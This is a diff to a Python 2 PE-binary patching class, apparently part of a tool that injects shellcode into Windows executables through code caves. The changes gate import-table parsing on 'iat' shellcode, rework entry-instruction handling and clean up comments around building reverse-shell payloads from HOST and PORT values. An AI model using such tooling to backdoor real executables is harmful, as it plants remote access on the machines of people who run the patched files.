@@ -315,42 +315,46 @@ class pebin():
         ####################################
         #### Parse imports via pefile ######
         self.binary.seek(0)
-        pe = pefile.PE(self.FILE, fast_load=True)
-        #pe = pefile.PE(data=self.binary)
-        pe.parse_data_directories()
+        #make this option only if a IAT based shellcode is selected
+        if 'iat' in self.SHELL:
+            print "[*] Loading PE in pefile"
+            pe = pefile.PE(self.FILE, fast_load=True)
+            #pe = pefile.PE(data=self.binary)
+            print "[*] Parsing data directories"
+            pe.parse_data_directories()
 
-        try:
-            for entry in pe.DIRECTORY_ENTRY_IMPORT:
-                #print entry.dll
-                for imp in entry.imports:
-                    #print imp.name
-                    #print "\t", imp.name
-                    if imp.name is None:
-                        continue
-                    if imp.name.lower() == 'loadlibrarya':
-                        self.flItms['LoadLibraryAOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
-                        self.flItms['LoadLibraryA'] = imp.address
-                    if imp.name.lower() == 'getprocaddress':
-                        self.flItms['GetProcAddressOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
-                        self.flItms['GetProcAddress'] = imp.address
-                    ''' #save for later use
-                    if imp.name.lower() == 'createprocessa':
-                        print imp.name, hex(imp.address)
+            try:
+                for entry in pe.DIRECTORY_ENTRY_IMPORT:
+                    #print entry.dll
+                    for imp in entry.imports:
+                        #print imp.name
+                        #print "\t", imp.name
+                        if imp.name is None:
+                            continue
+                        if imp.name.lower() == 'loadlibrarya':
+                            self.flItms['LoadLibraryAOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
+                            self.flItms['LoadLibraryA'] = imp.address
+                        if imp.name.lower() == 'getprocaddress':
+                            self.flItms['GetProcAddressOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
+                            self.flItms['GetProcAddress'] = imp.address
+                        ''' #save for later use
+                        if imp.name.lower() == 'createprocessa':
+                            print imp.name, hex(imp.address)
 
-                    if imp.name.lower() == 'waitforsingleobject':
-                        print imp.name, hex(imp.address)
+                        if imp.name.lower() == 'waitforsingleobject':
+                            print imp.name, hex(imp.address)
 
-                    if imp.name.lower() == 'virtualalloc':
-                        print imp.name, hex(imp.address)
+                        if imp.name.lower() == 'virtualalloc':
+                            print imp.name, hex(imp.address)
 
-                    if imp.name.lower() == 'connect':
-                        print imp.name, hex(imp.address)
+                        if imp.name.lower() == 'connect':
+                            print imp.name, hex(imp.address)
 
-                    if imp.name.lower() == 'createthread':
-                        print imp.name, hex(imp.address)
-                    '''
-        except Exception as e:
-            print "Exception:", str(e)
+                        if imp.name.lower() == 'createthread':
+                            print imp.name, hex(imp.address)
+                        '''
+            except Exception as e:
+                print "Exception:", str(e)
 
         #####################################
 
@@ -689,7 +693,7 @@ class pebin():
         """
         print "[*] Checking if binary is supported"
         self.flItms['supported'] = False
-        #global f
+        #convert to with open FIX
         self.binary = open(self.FILE, "r+b")
         if self.binary.read(2) != "\x4d\x5a":
             print "%s not a PE File" % self.FILE
@@ -711,15 +715,13 @@ class pebin():
 
         if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
             #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':
-            self.flItms, self.flItms['count_bytes'] = targetFile.pe64_entry_instr()
+            targetFile.pe64_entry_instr()
         elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
             #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':
-            self.flItms, self.flItms['count_bytes'] = targetFile.pe32_entry_instr()
+            targetFile.pe32_entry_instr()
         else:
             self.flItms['supported'] = False
 
-        #This speeds things up, MAKE IT OPTIONAL
-        #CONFIG
         if self.CHECK_ADMIN is True:
             self.flItms['runas_admin'] = self.runas_admin()
 
@@ -839,19 +841,13 @@ class pebin():
         else:
             ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()
 
-        #write instructions and shellcode
-        #remove if this breaks shit... CHECK ME
         self.set_shells()
-
-        #self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
-        #print self.flItms['allshells'], self.flItms['shellcode']
 
         if self.flItms['cave_jumping'] is True:
             if self.flItms['stager'] is False:
                 temp_jmp = "\xe9"
                 breakupvar = eat_code_caves(self.flItms, 1, 2)
                 test_length = int(self.flItms['CavesPicked'][2][1], 16) - int(self.flItms['CavesPicked'][1][1], 16) - len(self.flItms['allshells'][1]) - 5
-                #test_length = breakupvar - len(self.flItms['allshells'][1]) - 4
                 if test_length < 0:
                     temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))
                 else:
@@ -934,8 +930,8 @@ class pebin():
                     print "   {0}".format(item)
 
             return False
-        else:
-            shell_cmd = self.SHELL + "()"
+        #else:
+        #    shell_cmd = self.SHELL + "()"
         self.flItms['shells'] = self.flItms['bintype'](self.HOST, self.PORT, self.SUPPLIED_SHELLCODE)
         self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
         self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()
@@ -1050,7 +1046,6 @@ class pebin():
             excludedirs = excludedirs + vista7win82012x64excludedirs
 
         filelist = set()
-        folderCount = 0
 
         exclude = False
         for path in targetdirs:
